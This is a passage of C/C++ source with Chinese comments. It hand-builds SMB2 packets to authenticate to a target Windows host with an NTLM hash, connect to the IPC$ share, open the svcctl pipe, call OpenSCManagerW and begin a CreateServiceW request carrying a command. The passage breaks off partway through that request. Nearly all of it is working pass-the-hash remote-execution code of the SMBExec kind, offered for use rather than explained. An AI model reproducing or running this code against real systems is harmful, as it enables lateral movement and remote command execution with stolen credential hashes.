	char auth_domain_length[2] = { 0x00,0x00 };
	char auth_username_length[2] = { 0x00,0x00 };
	auth_domain_length[0] = (wcslen(domain) * 2);
	auth_username_length[0] = (wcslen(username) * 2);
	char auth_domain_offset[4] = { 0x40,0x00,0x00,0x00 };
	char auth_username_offset[4] = { 0x00,0x00,0x00,0x00 };
	char auth_hostname_offset[4] = { 0x00,0x00,0x00,0x00 };
	char auth_LM_offset[4] = { 0x00,0x00,0x00,0x00 };
	char auth_NTLM_offset[4] = { 0x00,0x00,0x00,0x00 };
	auth_username_offset[0] = (auth_domain_length[0] + 64);
	auth_hostname_offset[0] = (auth_domain_length[0] + auth_username_length[0] + 64);
	auth_LM_offset[0] = (auth_domain_length[0] + auth_username_length[0] + (wcslen(auth_hostname) * 2) + 64);
	auth_NTLM_offset[0] = (auth_domain_length[0] + auth_username_length[0] + (wcslen(auth_hostname) * 2) + 88);

	char NTLM_Key[NTLMSSP_Length / 2];
	for (int i = 0; i < NTLMSSP_Length; i++) {
		sscanf(NTLMHash + 2 * i, "%2X", &NTLM_Key[i]);
	}

	wchar_t* username_and_target = (wchar_t*)VirtualAlloc(NULL,(auth_domain_length[0] + auth_username_length[0]),MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	memcpy(username_and_target, username, wcslen(username) * 2 );

	//用户名转大写
	for (size_t i = 0; i <= wcslen(username) * 2; i++) {
		if (username_and_target[i] >= 'a' && username_and_target[i] <= 'z') 
		{
			if (username_and_target[i] == '\0')
			{
				continue;
			}
			username_and_target[i] = username_and_target[i] - 32;
		}
	}

	wcscat(username_and_target, domain);
	
	//HMAC加密hash
	BYTE* NTLMv2_hash = HMAC(EVP_md5(), NTLM_Key, 16, (const unsigned char*)username_and_target, 48 ,NULL , NULL);

	BYTE client_challenge[8] = { 0xe4,0xef,0xa7,0xcc,0x66,0xa5,0x71,0x53 }; //随机值		

	BYTE RandomArr[8] = { 0x43, 0x45, 0x57, 0x3F, 0x8F, 0xAE, 0x54, 0x13 };
	int m = 1;
	int n = 255;
	srand((unsigned)time(NULL));
	for (size_t i = 0; i < 8; i++)
	{
		RandomArr[i] = 1 + rand() % 255;	
	}

	//ProcessId = 21344;
	BYTE AvPairsEnd[8] = { 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 };
	BYTE session_key_offset[4] = { 0x00,0x00,0x00,0x00 };
	BYTE Temp_target_time_bytes[8] = { 85,39,104,222,207,156,216,1 };
	BYTE Temp_NTLM_challeng[8] = { 148,19,32,42,218,74,9,139 };

	BYTE* server_challenge_and_security_blob_bytes_buf = new BYTE[sizeof(server_challenge_and_security_blob_bytes) + target_details_len + 8];
	ZeroMemory(server_challenge_and_security_blob_bytes_buf, sizeof(server_challenge_and_security_blob_bytes) + target_details_len + 8);
	server_challenge_and_security_blob_bytes Server_challenge_and_security_blob_bytes = server_challenge_and_security_blob_bytesInit();
	memcpy(Server_challenge_and_security_blob_bytes.NTLM_challenge, NTLM_challenge , 8);
	memcpy(Server_challenge_and_security_blob_bytes.TimeStamp, target_time_bytes, 8);  //时间戳
	memcpy(Server_challenge_and_security_blob_bytes.Random, RandomArr, 8);			   //随机8字节
	memcpy(Server_challenge_and_security_blob_bytes.target_details, target_details, target_details_len);

	//将结构体拷贝到缓冲区
	memcpy(server_challenge_and_security_blob_bytes_buf, &Server_challenge_and_security_blob_bytes ,sizeof(Server_challenge_and_security_blob_bytes) + target_details_len);  //36字节(有8字节是challage)

	//最后拼接8个0
	memcpy((char *)((ULONG64)server_challenge_and_security_blob_bytes_buf + target_details_len + sizeof(server_challenge_and_security_blob_bytes)) , AvPairsEnd , 8);
	DWORD Server_challenge_and_security_blob_bytes_len = sizeof(server_challenge_and_security_blob_bytes) + target_details_len + 8;


	//第二次HMAC加密，密钥为NTLMv2_hash
	BYTE* NTLMv2_response = new BYTE[Server_challenge_and_security_blob_bytes_len + 8];
	ZeroMemory(NTLMv2_response, Server_challenge_and_security_blob_bytes_len + 8);

	memcpy(NTLMv2_response, HMAC(EVP_md5(), NTLMv2_hash, 16, server_challenge_and_security_blob_bytes_buf, Server_challenge_and_security_blob_bytes_len, NULL, NULL),16);
	memcpy((char*)((ULONG64)NTLMv2_response + 16), (char*)((ULONG64)server_challenge_and_security_blob_bytes_buf + 8), Server_challenge_and_security_blob_bytes_len - 8);  //跳过8字节 -- NTLMchallage
	BYTE NTLMv2_response_length[2] = { 0x00,0x00 };
	NTLMv2_response_length[0] = Server_challenge_and_security_blob_bytes_len + 8;

	DWORD dwsession_key_offset = auth_domain_length[0] + auth_username_length[0] + auth_hostname_length[0] + NTLMv2_response_length[0] + 88;
	memcpy(session_key_offset, &dwsession_key_offset,sizeof(dwsession_key_offset));

	//构造NTLMSSP_respones
	NTLMSSP_response NTLMSSP_Response = NTLMSSP_responseInit();     // + auth_domain_bytes + auth_username_bytes + auth_hostname_bytes + LMHash + NTLMv2_response
	memcpy(NTLMSSP_Response.auth_LM_offset, auth_LM_offset, sizeof(auth_LM_offset));
	memcpy(NTLMSSP_Response.NTLMv2_response_length, NTLMv2_response_length,sizeof(NTLMv2_response_length));
	memcpy(NTLMSSP_Response.NTLMv2_response_length2, NTLMv2_response_length, sizeof(NTLMv2_response_length));
	memcpy(NTLMSSP_Response.auth_NTLM_offset, auth_NTLM_offset, sizeof(auth_NTLM_offset));
	memcpy(NTLMSSP_Response.auth_domain_length, auth_domain_length, sizeof(auth_domain_length));
	memcpy(NTLMSSP_Response.auth_domain_length2, auth_domain_length, sizeof(auth_domain_length));
	memcpy(NTLMSSP_Response.auth_domain_offset, auth_domain_offset, sizeof(auth_domain_offset));
	memcpy(NTLMSSP_Response.auth_username_length, auth_username_length,sizeof(auth_username_length));
	memcpy(NTLMSSP_Response.auth_username_length2, auth_username_length, sizeof(auth_username_length));
	memcpy(NTLMSSP_Response.auth_username_offset, auth_username_offset, sizeof(auth_username_offset));
	memcpy(NTLMSSP_Response.auth_hostname_length, auth_hostname_length, sizeof(auth_hostname_length));
	memcpy(NTLMSSP_Response.auth_hostname_length2, auth_hostname_length, sizeof(auth_hostname_length));
	memcpy(NTLMSSP_Response.auth_hostname_offset, auth_hostname_offset, sizeof(auth_hostname_offset));
	memcpy(NTLMSSP_Response.session_key_length, session_key_length, sizeof(session_key_length));
	memcpy(NTLMSSP_Response.session_key_length2, session_key_length, sizeof(session_key_length));
	memcpy(NTLMSSP_Response.session_key_offset, session_key_offset, sizeof(session_key_offset));
	memcpy(NTLMSSP_Response.negotiate_flags, negotiate_flags, sizeof(negotiate_flags));
	
	//结构尾项处理
	DWORD NTLMSSP_response_end_buf_size = wcslen(username) * 2 + wcslen(domain) * 2 + wcslen(auth_hostname) * 2 + NTLMv2_response_length[0] + 24;
	char* NTLMSSP_response_end = new char[NTLMSSP_response_end_buf_size];
	char NTLMSSP_response_end2[24] = { 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 };

	memcpy(NTLMSSP_response_end, domain, wcslen(domain) * 2);
	memcpy((char*)((ULONG64)NTLMSSP_response_end + wcslen(domain) * 2), username, wcslen(username) * 2);
	memcpy((char*)((ULONG64)NTLMSSP_response_end + wcslen(username) * 2 + wcslen(domain) * 2), auth_hostname, wcslen(auth_hostname) * 2);
	memcpy((char*)((ULONG64)NTLMSSP_response_end + wcslen(username) * 2 + wcslen(domain) * 2 + wcslen(auth_hostname) * 2), auth_hostname, auth_hostname_length[0]);
	memcpy((char*)((ULONG64)NTLMSSP_response_end + wcslen(username) * 2 + wcslen(domain) * 2 + wcslen(auth_hostname) * 2), NTLMSSP_response_end2, 24);
	memcpy((char*)((ULONG64)NTLMSSP_response_end + wcslen(username) * 2 + wcslen(domain) * 2 + wcslen(auth_hostname) * 2) + 24, NTLMv2_response, NTLMv2_response_length[0]);

	//申请一片新内存，拼接之前所处理的所有数据
	char* NTLMSSP_response_send = new char[sizeof(NTLMSSP_Response) + NTLMSSP_response_end_buf_size];
	memcpy(NTLMSSP_response_send,&NTLMSSP_Response,sizeof(NTLMSSP_Response));
	memcpy((char*)((ULONG64)NTLMSSP_response_send + sizeof(NTLMSSP_Response)), NTLMSSP_response_end, NTLMSSP_response_end_buf_size);

	//发包
	//SMB2Header
	ZeroMemory(sendbuf, 1024);
	SMB2Header = SMB2HeaderInit();
	SMB2Header.Command[0] = 0x01;
	SMB2Header.CreditRequest[0] = 0x01;
	SMB2Header.MessageID[0] = ++MessageID;
	SMB2Header.ProcessID[0] = *(BYTE*)&ProcessId;
	SMB2Header.ProcessID[1] = *((BYTE*)&ProcessId + 1);

	memcpy(SMB2Header.SessionID, session_ID, 8);

	//NTLMSSP_Response
	DWORD NTLMSSP_size = sizeof(NTLMSSP_Response) + NTLMSSP_response_end_buf_size;  //348
	PacketNTLMSSPAuth PacketNTLMSSPAuth = PacketNTLMSSPAuthInit();
	PacketNTLMSSPAuth.ASNLength_1[0] = 1;
	PacketNTLMSSPAuth.ASNLength_1[1] = NTLMSSP_size + 12;
	PacketNTLMSSPAuth.ASNLength_2[0] = 1;
	PacketNTLMSSPAuth.ASNLength_2[1] = NTLMSSP_size + 8;
	PacketNTLMSSPAuth.ASNLength_3[0] = 1;
	PacketNTLMSSPAuth.ASNLength_3[1] = NTLMSSP_size + 4;
	PacketNTLMSSPAuth.NTLMSSPLength[0] = 1;
	PacketNTLMSSPAuth.NTLMSSPLength[1] = NTLMSSP_size;

	//创建一个新内存去拼接
	DWORD PacketNTLMSSPAuth_buf_size = sizeof(PacketNTLMSSPAuth) + NTLMSSP_size;
	char* PacketNTLMSSPAuth_buf = new char[PacketNTLMSSPAuth_buf_size];
	ZeroMemory(PacketNTLMSSPAuth_buf, PacketNTLMSSPAuth_buf_size);
	memcpy(PacketNTLMSSPAuth_buf, &PacketNTLMSSPAuth, sizeof(PacketNTLMSSPAuth));
	memcpy((char*)((ULONG64)PacketNTLMSSPAuth_buf + sizeof(PacketNTLMSSPAuth)), NTLMSSP_response_send, NTLMSSP_size);


	//PacketSMB2SessionSetupRequest
	DWORD PacketSMB2SessionSetupRequest_buf_size = sizeof(PacketSMB2SessionSetupRequest_nobuf) + PacketNTLMSSPAuth_buf_size;
	char* PacketSMB2SessionSetupRequest_buf = new char[PacketSMB2SessionSetupRequest_buf_size];
	ZeroMemory(PacketSMB2SessionSetupRequest_buf, PacketSMB2SessionSetupRequest_buf_size);
	PacketSMB2SessionSetupRequest_nobuf packetSMB2SessionSetupRequest_nobuf = PacketSMB2SessionSetupRequest_nobuf();
	packetSMB2SessionSetupRequest_nobuf.SecurityBufferLength[0] = PacketNTLMSSPAuth_buf_size;
	packetSMB2SessionSetupRequest_nobuf.SecurityBufferLength[1] = 1;
	memcpy(PacketSMB2SessionSetupRequest_buf,&packetSMB2SessionSetupRequest_nobuf,sizeof(packetSMB2SessionSetupRequest_nobuf));
	memcpy((char*)((ULONG64)PacketSMB2SessionSetupRequest_buf + sizeof(packetSMB2SessionSetupRequest_nobuf)), PacketNTLMSSPAuth_buf, PacketNTLMSSPAuth_buf_size);


	//SMBData
	DWORD Length = sizeof(SMB2Header) + PacketSMB2SessionSetupRequest_buf_size;
	PacketNetBIOSSessionService PacketNetBIOSSessionService = PacketNetBIOSSessionServiceInit();
	PacketNetBIOSSessionService.Length[1] = 1;
	PacketNetBIOSSessionService.Length[2] = *(BYTE*)&Length;

	//拼接最终要发送的包
	DWORD Send_Packet_Size = sizeof(PacketNetBIOSSessionService) + sizeof(SMB2Header) + PacketSMB2SessionSetupRequest_buf_size; 
	char* Send_Packet_Buf = new char[Send_Packet_Size];
	ZeroMemory(Send_Packet_Buf, Send_Packet_Size);
	memcpy(Send_Packet_Buf, &PacketNetBIOSSessionService,sizeof(PacketNetBIOSSessionService));
	memcpy((char*)((ULONG64)Send_Packet_Buf + sizeof(PacketNetBIOSSessionService)), &SMB2Header, sizeof(SMB2Header));
	memcpy((char*)((ULONG64)Send_Packet_Buf + sizeof(PacketNetBIOSSessionService) + sizeof(SMB2Header)), PacketSMB2SessionSetupRequest_buf, PacketSMB2SessionSetupRequest_buf_size);

	ret = send(socks, Send_Packet_Buf, Send_Packet_Size, 0);
	dRet = recv(socks, g_RecvBuf, 4096, 0);
	if ((*(g_RecvBuf + 12) == 0) && (*(g_RecvBuf + 13) == 0) && (*(g_RecvBuf + 14) == 0) && (*(g_RecvBuf + 15) == 0))
	{
		printf("[+]NTLM Auth Successfully!\r\n");
	}
	else
	{
		printf("[!]NTLM Auth Failed!\r\n");
		exit(-1);
	}
	//---------------------------------------NTLM--------------------------------------------------


	//--------------------------------------IPC-----------------------------------------------
	//使用IPC连接
	printf("[+]IPC Connect Attemp\r\n");
	char* SMB_path = new char[4 + wcslen(Target_IP) * 2 + 10]; // \\192.168.98.156\IPC$
	memcpy(SMB_path,L"\\\\",4);
	memcpy((char*)((ULONG64)SMB_path + 4), Target_IP, wcslen(Target_IP) * 2);
	memcpy((char*)((ULONG64)SMB_path + 4) + wcslen(Target_IP) * 2, L"\\IPC$",10);
	DWORD SMB_path_len = 4 + wcslen(Target_IP) * 2 + 10;

	BYTE named_pipe_UUID[16] = { 0x81,0xbb,0x7a,0x36,0x44,0x98,0xf1,0x35,0xad,0x32,0x98,0xf0,0x38,0x00,0x10,0x03};

	//CMD
	char Command_end[2] = { 0x00,0x00 };
	DWORD Command_len = (wcslen(Command) * 2);
	char* Command_buf = new char[Command_len];
	memcpy(Command_buf, Command, Command_len - 2);
	memcpy((char*)((ULONG64)Command_buf + Command_len - 2), Command_end, 2);

	DWORD SMB_split_index = 4256;

	//Tree Connect
	char* TreeId = new char[4];
	memcpy(TreeId,(char*)((ULONG64)g_RecvBuf + 40),4);
	
	SMB2Header = SMB2HeaderInit();
	SMB2Header.MessageID[0] = ++MessageID;
	SMB2Header.Command[0] = 0x03;  //三号命令 Tree Connect
	SMB2Header.ProcessID[0] = *(BYTE*)&ProcessId;
	SMB2Header.ProcessID[1] = *((BYTE*)&ProcessId + 1);
	memcpy(SMB2Header.SessionID, session_ID, 8);

	PacketSMB2TreeConnectRequest PacketSMB2TreeConnectRequest = PacketSMB2TreeConnectRequestInit();
	PacketSMB2TreeConnectRequest.path_length[0] = SMB_path_len;
	//PacketSMB2TreeConnectRequest结构最后还需要SMB_path的缓冲区
	char* PacketSMB2TreeConnectRequest_buf = new char[sizeof(PacketSMB2TreeConnectRequest) + SMB_path_len];
	memcpy(PacketSMB2TreeConnectRequest_buf, &PacketSMB2TreeConnectRequest,sizeof(PacketSMB2TreeConnectRequest));
	memcpy((char*)((ULONG64)PacketSMB2TreeConnectRequest_buf + sizeof(PacketSMB2TreeConnectRequest)), SMB_path, SMB_path_len);

	//拼接最后的发送包  sendbuf = NetBIOS_session_service + SMB2_header + SMB2_data
	PacketNetBIOSSessionService1.Length[2] = sizeof(SMB2Header) + sizeof(PacketSMB2TreeConnectRequest) + SMB_path_len;
	ZeroMemory(sendbuf, 1024);
	memcpy(sendbuf, &PacketNetBIOSSessionService1,sizeof(PacketNetBIOSSessionService1));
	memcpy((char*)((ULONG64)sendbuf + sizeof(PacketNetBIOSSessionService1)),&SMB2Header,sizeof(SMB2Header));
	memcpy((char*)((ULONG64)sendbuf + sizeof(PacketNetBIOSSessionService1)) + sizeof(SMB2Header), PacketSMB2TreeConnectRequest_buf, sizeof(PacketSMB2TreeConnectRequest) + SMB_path_len);

	//send
	ret = send(socks, sendbuf, sizeof(PacketNetBIOSSessionService1) + sizeof(SMB2Header) + sizeof(PacketSMB2TreeConnectRequest) + SMB_path_len, 0);
	dRet = recv(socks, g_RecvBuf, 4096, 0);
	if ((*(g_RecvBuf + 12) == 0) && (*(g_RecvBuf + 13) == 0) && (*(g_RecvBuf + 14) == 0) && (*(g_RecvBuf + 15) == 0))
	{
		printf("[+]IPC Connect Successfully!\r\n");
	}
	else
	{
		printf("[!]IPC Connect Failed!\r\n");
		exit(-1);
	}
	//--------------------------------------IPC-----------------------------------------------

	//--------------------------------------RPC-----------------------------------------------
	//CreateRequest
	printf("[+]CreateRequest Attemp!\r\n");
	TreeId = new char[4];
	memcpy(TreeId, (char*)((ULONG64)g_RecvBuf + 40), 4);
	char SMB_named_pipe_bytes[12] = {0x73,0x00,0x76,0x00,0x63,0x00,0x63,0x00,0x74,0x00,0x6c,0x00};
	char Share_Access[4] = {0x07,0x00,0x00,0x00};

	SMB2Header = SMB2HeaderInit();
	SMB2Header.Command[0] = 0x05;
	SMB2Header.CreditRequest[0] = 1;
	SMB2Header.MessageID[0] = ++MessageID;
	SMB2Header.ProcessID[0] = *(BYTE*)&ProcessId;
	SMB2Header.ProcessID[1] = *((BYTE*)&ProcessId + 1);
	memcpy(SMB2Header.TreeID, TreeId, 4);
	memcpy(SMB2Header.SessionID, session_ID, 8);

	//PacketSMB2CreateRequestFileInit 结构后在拼接namepipe
	char* PacketSMB2CreateRequestFileInit_buf = new char[sizeof(PacketSMB2CreateRequestFile) + 12 + 4];
	PacketSMB2CreateRequestFile PacketSMB2CreateRequestFile = PacketSMB2CreateRequestFileInit();
	memcpy(PacketSMB2CreateRequestFileInit_buf, &PacketSMB2CreateRequestFile, sizeof(PacketSMB2CreateRequestFile));
	memcpy((char*)((ULONG64)PacketSMB2CreateRequestFileInit_buf + sizeof(PacketSMB2CreateRequestFile)), SMB_named_pipe_bytes,12);
	memcpy((char*)((ULONG64)PacketSMB2CreateRequestFileInit_buf + sizeof(PacketSMB2CreateRequestFile) + 12), Share_Access, 4);

	PacketNetBIOSSessionService = PacketNetBIOSSessionServiceInit();
	PacketNetBIOSSessionService.Length[2] = sizeof(SMB2Header) + sizeof(PacketSMB2CreateRequestFile) + 12 + 4;   //140

	ZeroMemory(sendbuf,1000);
	memcpy(sendbuf, &PacketNetBIOSSessionService, sizeof(PacketNetBIOSSessionService1));
	memcpy((char*)((ULONG64)sendbuf + sizeof(PacketNetBIOSSessionService1)), &SMB2Header, sizeof(SMB2Header));
	memcpy((char*)((ULONG64)sendbuf + sizeof(PacketNetBIOSSessionService1)) + sizeof(SMB2Header), PacketSMB2CreateRequestFileInit_buf, sizeof(PacketSMB2CreateRequestFile) + 12 + 4);

	//send
	ret = send(socks, sendbuf, sizeof(PacketNetBIOSSessionService) + sizeof(SMB2Header) + sizeof(PacketSMB2CreateRequestFile) + 12 + 4, 0);
	dRet = recv(socks, g_RecvBuf, 4096, 0);
	if ((*(g_RecvBuf + 12) == 0) && (*(g_RecvBuf + 13) == 0) && (*(g_RecvBuf + 14) == 0) && (*(g_RecvBuf + 15) == 0))
	{
		printf("[+]CreateRequest Successfully!\r\n");
	}
	else
	{
		printf("[!]CreateRequest Failed!\r\n");
		exit(-1);
	}

	char* File_ID = new char[16];
	memcpy(File_ID, (char*)((ULONG64)g_RecvBuf + 132), 16);




	//RPCBind
	printf("[+]RPCBind Attemp\r\n");
	SMB2Header.MessageID[0] = ++MessageID;
	SMB2Header.Command[0] = 0x09;
	SMB2Header.CreditRequest[0] = 0x01;

	PacketRPCBind PacketRPCBind = PacketRPCBindInit();  //全是写死的结构

	PacketSMB2WriteRequest PacketSMB2WriteRequest = PacketSMB2WriteRequestInit();
	memcpy(PacketSMB2WriteRequest.FileID, File_ID,16);
	PacketSMB2WriteRequest.Length[0] = sizeof(PacketRPCBind);


	DWORD RPC_data_length = sizeof(PacketSMB2WriteRequest) + sizeof(PacketRPCBind);

	PacketNetBIOSSessionService = PacketNetBIOSSessionServiceInit();
	PacketNetBIOSSessionService.Length[2] = sizeof(SMB2Header) + RPC_data_length;

	//send
	memcpy(sendbuf, &PacketNetBIOSSessionService, 4);
	memcpy((char*)((ULONG64)sendbuf + sizeof(PacketNetBIOSSessionService)),&SMB2Header,sizeof(SMB2Header));
	memcpy((char*)((ULONG64)sendbuf + sizeof(PacketNetBIOSSessionService)) + sizeof(SMB2Header), &PacketSMB2WriteRequest, sizeof(PacketSMB2WriteRequest));
	memcpy((char*)((ULONG64)sendbuf + sizeof(PacketNetBIOSSessionService)) + sizeof(SMB2Header) + sizeof(PacketSMB2WriteRequest), &PacketRPCBind, sizeof(PacketRPCBind));

	ret = send(socks, sendbuf, sizeof(PacketNetBIOSSessionService1) + sizeof(SMB2Header) + sizeof(PacketSMB2WriteRequest) + sizeof(PacketRPCBind), 0);
	dRet = recv(socks, g_RecvBuf, 4096, 0);
	if ((*(g_RecvBuf + 12) == 0) && (*(g_RecvBuf + 13) == 0) && (*(g_RecvBuf + 14) == 0) && (*(g_RecvBuf + 15) == 0))
	{
		printf("[+]RPCBind Successfully!\r\n");
	}
	else
	{
		printf("[!]RPCBind Failed!\r\n");
		exit(-1);
	}


	//ReadRequest
	SMB2Header.Command[0] = 0x08;
	SMB2Header.MessageID[0] = ++MessageID;

	PacketSMB2ReadRequest PacketSMB2ReadRequest = PacketSMB2ReadRequestInit();
	char PSRRLength[4] = {0xff,0x00,0x00,0x00};
	memcpy(PacketSMB2ReadRequest.FileID, File_ID, 16);
	memcpy(PacketSMB2ReadRequest.Length, PSRRLength, 4);

	PacketNetBIOSSessionService = PacketNetBIOSSessionServiceInit();
	PacketNetBIOSSessionService.Length[2] = sizeof(SMB2Header) + sizeof(PacketSMB2ReadRequest);

	//send
	memcpy(sendbuf, &PacketNetBIOSSessionService, 4);
	memcpy((char*)((ULONG64)sendbuf + sizeof(PacketNetBIOSSessionService)), &SMB2Header, sizeof(SMB2Header));
	memcpy((char*)((ULONG64)sendbuf + sizeof(PacketNetBIOSSessionService)) + sizeof(SMB2Header), &PacketSMB2ReadRequest, sizeof(PacketSMB2ReadRequest));

	ret = send(socks, sendbuf, sizeof(PacketNetBIOSSessionService1) + sizeof(SMB2Header) + sizeof(PacketSMB2ReadRequest), 0);
	dRet = recv(socks, g_RecvBuf, 4096, 0);


	//OpenSCManagaerW
	printf("[+]OpenSCManagaer Attemp\r\n");
	SMB2Header.Command[0] = 0x09;
	SMB2Header.MessageID[0] = ++MessageID;

	//中间需要拼接服务名
	printf("[+]ServiceName:%ws\r\n", ServiceName);
	srand((unsigned)time(NULL));

	DWORD ServerName_for_test_len = wcslen(ServiceName)+ 1;  //1字节是字符串结尾
	char* SMB_service_bytes = new char[(ServerName_for_test_len - 1) * 2 + 4];
	char Temp_buf[4] = {0x00,0x00,0x00,0x00};
	memcpy(SMB_service_bytes, ServiceName, (ServerName_for_test_len - 1) * 2 + 4);
	memcpy((char*)((ULONG64)SMB_service_bytes + (ServerName_for_test_len - 1) * 2), Temp_buf, 4 );

	PacketSCMOpenSCManagerW_1 PacketSCMOpenSCManagerW_1 = PacketSCMOpenSCManagerW_1Init();
	srand((unsigned)time(NULL));
	for (size_t i = 0; i < 8; i++)
	{
		RandomArr[i] = 1 + rand() % 255;
	}
	PacketSCMOpenSCManagerW_1.MachineName_MaxCount[0] = ServerName_for_test_len;
	PacketSCMOpenSCManagerW_1.MachineName_ActualCount[0] = ServerName_for_test_len;
	memcpy(PacketSCMOpenSCManagerW_1.MachineName_ReferentID, RandomArr , 2 );

	//下半部分
	PacketSCMOpenSCManagerW_2 PacketSCMOpenSCManagerW_2 = PacketSCMOpenSCManagerW_2Init();
	memcpy(PacketSCMOpenSCManagerW_2.Database_ReferentID, (char*)((ULONG64)RandomArr + 2),4);

	//需要拼接MachineName 缓冲区在中间
	DWORD PacketSCMOpenSCManagerW_len = sizeof(PacketSCMOpenSCManagerW_1) + (ServerName_for_test_len - 1) * 2 + 4 + sizeof(PacketSCMOpenSCManagerW_2);
	char* PacketSCMOpenSCManagerW = new char[PacketSCMOpenSCManagerW_len];
	memcpy(PacketSCMOpenSCManagerW, &PacketSCMOpenSCManagerW_1,sizeof(PacketSCMOpenSCManagerW_1));
	memcpy(PacketSCMOpenSCManagerW + sizeof(PacketSCMOpenSCManagerW_1), ServiceName, (ServerName_for_test_len - 1) * 2 + 4);
	memcpy(PacketSCMOpenSCManagerW + sizeof(PacketSCMOpenSCManagerW_1) + ((ServerName_for_test_len - 1) * 2 + 4), &PacketSCMOpenSCManagerW_2,sizeof(PacketSCMOpenSCManagerW_2));

	DWORD write_length = PacketSCMOpenSCManagerW_len + 24;
	DWORD alloc_hint = PacketSCMOpenSCManagerW_len;
	PacketRPCRequest PacketRPCRequest = PacketRPCRequestInit();
	PacketRPCRequest.PacketFlags = 0x03;
	memcpy(PacketRPCRequest.FragLength, &write_length, 2);
	PacketRPCRequest.CallID[0] = 0x01;
	memcpy(PacketRPCRequest.AllocHint, &alloc_hint, 4);
	PacketRPCRequest.Opnum[0] = 0x0f;

	PacketSMB2WriteRequest.Length[0] = write_length;

	//PacketSMB2WriteRequest
	RPC_data_length = sizeof(PacketSMB2WriteRequest) + sizeof(PacketRPCRequest) + PacketSCMOpenSCManagerW_len;

	PacketNetBIOSSessionService = PacketNetBIOSSessionServiceInit();
	PacketNetBIOSSessionService.Length[2] = sizeof(SMB2Header) + RPC_data_length;

	ZeroMemory(sendbuf, 1000);
	memcpy(sendbuf, &PacketNetBIOSSessionService, 4);
	memcpy((char*)((ULONG64)sendbuf + sizeof(PacketNetBIOSSessionService)), &SMB2Header, sizeof(SMB2Header));
	memcpy((char*)((ULONG64)sendbuf + sizeof(PacketNetBIOSSessionService)) + sizeof(SMB2Header), &PacketSMB2WriteRequest, sizeof(PacketSMB2WriteRequest));
	memcpy((char*)((ULONG64)sendbuf + sizeof(PacketNetBIOSSessionService)) + sizeof(SMB2Header) + sizeof(PacketSMB2WriteRequest), &PacketRPCRequest,sizeof(PacketRPCRequest));
	memcpy((char*)((ULONG64)sendbuf + sizeof(PacketNetBIOSSessionService)) + sizeof(SMB2Header) + sizeof(PacketSMB2WriteRequest) + sizeof(PacketRPCRequest), PacketSCMOpenSCManagerW, PacketSCMOpenSCManagerW_len);

	ret = send(socks, sendbuf, sizeof(PacketNetBIOSSessionService1) + sizeof(SMB2Header) + sizeof(PacketSMB2WriteRequest) + sizeof(PacketRPCRequest) + PacketSCMOpenSCManagerW_len, 0);
	dRet = recv(socks, g_RecvBuf, 4096, 0);
	if ((*(g_RecvBuf + 12) == 0) && (*(g_RecvBuf + 13) == 0) && (*(g_RecvBuf + 14) == 0) && (*(g_RecvBuf + 15) == 0))
	{
		printf("[+]OpenSCManagaer Successfully!\r\n");
	}
	else
	{
		printf("[!]OpenSCManagaer Failed!\r\n");
		exit(-1);
	}


	//ReadRequest
	SMB2Header.Command[0] = 0x8;
	SMB2Header.MessageID[0] = ++MessageID;
	PacketNetBIOSSessionService = PacketNetBIOSSessionServiceInit();
	PacketNetBIOSSessionService.Length[2] = sizeof(SMB2Header) + sizeof(PacketSMB2ReadRequest);

	ZeroMemory(sendbuf, 1000);
	memcpy(sendbuf, &PacketNetBIOSSessionService, 4);
	memcpy((char*)((ULONG64)sendbuf + sizeof(PacketNetBIOSSessionService)), &SMB2Header, sizeof(SMB2Header));
	memcpy((char*)((ULONG64)sendbuf + sizeof(PacketNetBIOSSessionService)) + sizeof(SMB2Header), &PacketSMB2ReadRequest, sizeof(PacketSMB2ReadRequest));
	ret = send(socks, sendbuf, sizeof(PacketNetBIOSSessionService1) + sizeof(SMB2Header) + sizeof(PacketSMB2ReadRequest), 0);
	dRet = recv(socks, g_RecvBuf, 4096, 0);

	//CheckAccess
	for (size_t i = 128; i < 131; i++)
	{
		if (*((char*)(ULONG64)g_RecvBuf + i) == 0)
		{
			continue;
		}
		else
		{
			printf("[!]ReadRequest Failed\r\n");
			break;
		}
	}
	printf("[+]ReadRequest Successfully\r\n");

	//SCMCreateServiceW
	printf("[+]SCMCreateServiceW\r\n");
	char* SMB_service_manager_context_handle = new char[20];
	memcpy(SMB_service_manager_context_handle,((char*)(ULONG64)g_RecvBuf + 108),20);

	//拼接第一部分
	PacketSCMCreateServiceW1 PacketSCMCreateServiceW1 = PacketSCMCreateServiceW1Init();  
	char* PacketSCMCreateServiceW1_buf = new char[sizeof(PacketSCMCreateServiceW1) + ServerName_for_test_len];
	memcpy(PacketSCMCreateServiceW1.ContextHandle, SMB_service_manager_context_handle, 20);
	PacketSCMCreateServiceW1.ServiceLength[0] = ServerName_for_test_len;
	PacketSCMCreateServiceW1.ServiceName_ActualCount[0] = ServerName_for_test_len;
	memcpy(PacketSCMCreateServiceW1_buf, &PacketSCMCreateServiceW1, sizeof(PacketSCMCreateServiceW1));
	memcpy((char*)((ULONG64)PacketSCMCreateServiceW1_buf + sizeof(PacketSCMCreateServiceW1)), SMB_service_bytes, (ServerName_for_test_len - 1) * 2 + 4);
	DWORD PacketSCMCreateServiceW1_buf_len = sizeof(PacketSCMCreateServiceW1) + (ServerName_for_test_len - 1) * 2 + 4;

	//拼接第二部分
	srand((unsigned)time(NULL));
	for (size_t i = 0; i < 8; i++)
	{
		RandomArr[i] = 1 + rand() % 255;
	}
	PacketSCMCreateServiceW2 PacketSCMCreateServiceW2 = PacketSCMCreateServiceW2Init();
	char* PacketSCMCreateServiceW2_buf = new char[sizeof(PacketSCMCreateServiceW2) + ServerName_for_test_len];
	memcpy(PacketSCMCreateServiceW2.DisplayName_ReferentID, RandomArr, 2);
	PacketSCMCreateServiceW2.DisplayName_MaxCount[0] = ServerName_for_test_len;
	PacketSCMCreateServiceW2.DisplayName_ActualCount[0] = ServerName_for_test_len;
	memcpy(PacketSCMCreateServiceW2_buf, &PacketSCMCreateServiceW2, sizeof(PacketSCMCreateServiceW2));
	memcpy((char*)((ULONG64)PacketSCMCreateServiceW2_buf + sizeof(PacketSCMCreateServiceW2)), SMB_service_bytes, (ServerName_for_test_len - 1) * 2 + 4);
	DWORD PacketSCMCreateServiceW_buf_len2 = sizeof(PacketSCMCreateServiceW2) + (ServerName_for_test_len - 1) * 2 + 4;

	//拼接第三部分
